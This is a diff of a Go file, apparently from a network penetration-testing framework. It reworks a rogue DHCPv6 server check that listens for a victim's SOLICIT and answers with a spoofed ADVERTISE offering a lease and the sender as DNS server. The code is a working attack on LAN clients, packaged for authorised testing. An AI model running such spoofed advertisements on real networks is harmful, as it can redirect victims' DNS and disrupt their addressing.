@@ -1,15 +1,13 @@
-// roguedhcp6.go implements the rogue DHCPv6 server attack behavior.
-//
-// Durability (from the catalog): transient-decay. The attack completes
-// a solicit→advertise cycle against the fixture and emits a lease
-// finding with its decay note (~300s lifetime). No explicit teardown.
-//
-// The behavior observes a SOLICIT on the attack leg and responds with
-// an ADVERTISE from the rogue server.
+// roguedhcp6.go implements the rogue DHCPv6 server check. Impact
+// temporary, restore decay with a 600 s bound, affects clients: the
+// ADVERTISE answers the victim's SOLICIT with a lease whose valid lifetime
+// is 600 s, so a client that takes it drops the address when that
+// lifetime runs out, and nothing is restored by the run.
 
 package ip6
 
 import (
+	"bytes"
 	"context"
 	"encoding/binary"
 	"encoding/json"
@@ -21,7 +19,7 @@ import (
 
 	"go.aledante.io/FlowSeer/src/common/errs"
 	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 )
 
 type rogueDHCPv6Finding struct {
@@ -33,45 +31,63 @@ type rogueDHCPv6Finding struct {
 	DecayNote     string `json:"decay_note"`
 }
 
-// RunRogueDHCPv6 completes a solicit→advertise cycle against the
-// fixture and emits the lease finding with its decay note. The behavior
-// observes a SOLICIT on the attack leg's RX and responds with an
-// ADVERTISE from the rogue server.
-// It waits until a frame arrives or ctx is canceled; callers must supply a
-// deadline to bound an idle receive. Cancellation while waiting returns ctx.Err().
-// Receive and decode errors, and missing or empty client IDs, return errors
-// without a reply.
-func RunRogueDHCPv6(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC()
-
-	// Receive a SOLICIT from the fixture (pushed by the test harness).
-	ch := deps.AttackLeg.Receive(ctx)
-	var solicit *layers.DHCPv6
-	select {
-	case frame, ok := <-ch:
-		if err := ctx.Err(); err != nil {
-			return err
-		}
-		if !ok {
-			return errs.Msg("roguedhcp6: no solicit received")
-		}
-		if frame.Err != nil {
-			return errs.Wrap(frame.Err, "roguedhcp6: receive solicit")
-		}
-		var err error
-		solicit, err = decodeDHCPv6(frame.Data)
-		if err != nil {
-			return errs.Wrap(err, "roguedhcp6: decode solicit")
-		}
-	case <-ctx.Done():
-		return ctx.Err()
+// solicitFrom returns the DHCPv6 SOLICIT in data when its Ethernet source
+// is client and it carries a client identifier, with the host it came
+// from: that Ethernet source and the IPv6 source. A frame that does not
+// decode to that is nil.
+func solicitFrom(data []byte, client net.HardwareAddr) (*layers.DHCPv6, check.Host) {
+	if len(data) < 14 || !bytes.Equal(data[6:12], client) {
+		return nil, check.Host{}
 	}
-
-	if solicit.MsgType != layers.DHCPv6MsgTypeSolicit {
-		return errs.Msgf("roguedhcp6: expected SOLICIT, got %s", solicit.MsgType)
+	pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
+	eth, ok := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
+	if !ok {
+		return nil, check.Host{}
 	}
+	ip, ok := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
+	if !ok {
+		return nil, check.Host{}
+	}
+	dhcp, ok := pkt.Layer(layers.LayerTypeDHCPv6).(*layers.DHCPv6)
+	if !ok || dhcp.MsgType != layers.DHCPv6MsgTypeSolicit {
+		return nil, check.Host{}
+	}
+	for _, opt := range dhcp.Options {
+		if opt.Code == layers.DHCPv6OptClientID && len(opt.Data) > 0 {
+			return dhcp, check.Host{IP: ip.SrcIP, MAC: eth.SrcMAC}
+		}
+	}
+	return nil, check.Host{}
+}
 
-	// Extract the client DUID from the SOLICIT options.
+// RunRogueDHCPv6 waits for the window for a SOLICIT from the target's IPv6
+// victim MAC on the attack leg and answers it with an ADVERTISE to the
+// host the SOLICIT came from, from the target's IPv6 server address,
+// which is also the DNS server it offers. The leased address, the
+// lifetimes, and the IAID are probe content. The verdict is pending: when
+// the window ends without a SOLICIT nothing was sent, and after the
+// ADVERTISE whether the client took the lease needs a REQUEST listener it
+// does not have. Cancellation while waiting returns ctx.Err(). A terminal
+// receive error comes back wrapped.
+func RunRogueDHCPv6(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	if err := deps.Target.Need(check.FieldVictim6, check.FieldVictim6MAC, check.FieldServer6); err != nil {
+		return check.Verdict{}, err
+	}
+	src := deps.AttackLeg.Addr().MAC
+	client := deps.Target.Victim6.MAC
+
+	frame, _, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
+		solicit, _ := solicitFrom(data, client)
+		return solicit != nil
+	})
+	if err != nil {
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: receive solicit")
+	}
+	if frame == nil {
+		return check.Pending(fmt.Sprintf("no solicit in %v", deps.Observe)), nil
+	}
+	solicit, from := solicitFrom(frame, client)
+
 	var clientDUID []byte
 	for _, opt := range solicit.Options {
 		if opt.Code == layers.DHCPv6OptClientID {
@@ -79,17 +95,13 @@ func RunRogueDHCPv6(ctx context.Context, deps runner.Deps) error {
 			break
 		}
 	}
-	if len(clientDUID) == 0 {
-		return errs.Msg("roguedhcp6: solicit missing or empty client ID")
-	}
 
-	// Craft and send the ADVERTISE response.
-	advertise, err := craftDHCPv6Advertise(src, solicit.TransactionID, clientDUID)
+	advertise, err := craftDHCPv6Advertise(src, deps.Target.Server6.IP, from, solicit.TransactionID, clientDUID)
 	if err != nil {
-		return errs.Wrap(err, "roguedhcp6: craft advertise")
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: craft advertise")
 	}
 	if err := deps.AttackLeg.Send(ctx, advertise); err != nil {
-		return errs.Wrap(err, "roguedhcp6: send advertise")
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: send advertise")
 	}
 
 	leaseAddr := net.ParseIP("fd00::200")
@@ -99,17 +111,17 @@ func RunRogueDHCPv6(ctx context.Context, deps runner.Deps) error {
 		LeaseAddress:  leaseAddr.String(),
 		PreferredLife: 300,
 		ValidLife:     600,
-		DecayNote:     "~300s lifetime announced",
+		DecayNote:     "600s valid lifetime announced",
 	})
 	deps.Emitter.Finding("dhcpv6", detail)
 
-	return nil
+	return check.Pending("no observable: lease acceptance needs a REQUEST listener"), nil
 }
 
 // craftDHCPv6Advertise builds a DHCPv6 ADVERTISE from the rogue server.
-func craftDHCPv6Advertise(src net.HardwareAddr, xid []byte, clientDUID []byte) ([]byte, error) {
+func craftDHCPv6Advertise(src net.HardwareAddr, serverIP net.IP, client check.Host, xid []byte, clientDUID []byte) ([]byte, error) {
 	eth := &layers.Ethernet{
-		DstMAC:       dhcpClientMAC,
+		DstMAC:       client.MAC,
 		SrcMAC:       src,
 		EthernetType: layers.EthernetTypeIPv6,
 	}
@@ -117,8 +129,8 @@ func craftDHCPv6Advertise(src net.HardwareAddr, xid []byte, clientDUID []byte) (
 		Version:    6,
 		NextHeader: layers.IPProtocolUDP,
 		HopLimit:   255,
-		SrcIP:      serverIP6,
-		DstIP:      clientIP6,
+		SrcIP:      serverIP,
+		DstIP:      client.IP,
 	}
 	udp := &layers.UDP{
 		SrcPort: 547,
@@ -151,25 +163,10 @@ func craftDHCPv6Advertise(src net.HardwareAddr, xid []byte, clientDUID []byte) (
 			layers.NewDHCPv6Option(layers.DHCPv6OptClientID, clientDUID),
 			layers.NewDHCPv6Option(layers.DHCPv6OptIANA, iaNAWithAddr),
 			layers.NewDHCPv6Option(layers.DHCPv6OptStatusCode, statusData),
-			layers.NewDHCPv6Option(layers.DHCPv6OptDNSServers, net.ParseIP("fd00::1").To16()),
+			layers.NewDHCPv6Option(layers.DHCPv6OptDNSServers, serverIP.To16()),
 		},
 	}
 	return craft.Default(eth, ip, udp, dhcp)
-}
-
-// decodeDHCPv6 decodes a DHCPv6 layer from a raw Ethernet frame
-// (Ethernet → IPv6 → UDP → DHCPv6).
-func decodeDHCPv6(data []byte) (*layers.DHCPv6, error) {
-	pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
-	dhcpLayer := pkt.Layer(layers.LayerTypeDHCPv6)
-	if dhcpLayer == nil {
-		return nil, errs.Msg("no DHCPv6 layer")
-	}
-	dhcp, ok := dhcpLayer.(*layers.DHCPv6)
-	if !ok {
-		return nil, errs.Msg("unexpected DHCPv6 layer type")
-	}
-	return dhcp, nil
 }
 
 var _ gopacket.SerializableLayer = (*layers.DHCPv6)(nil)
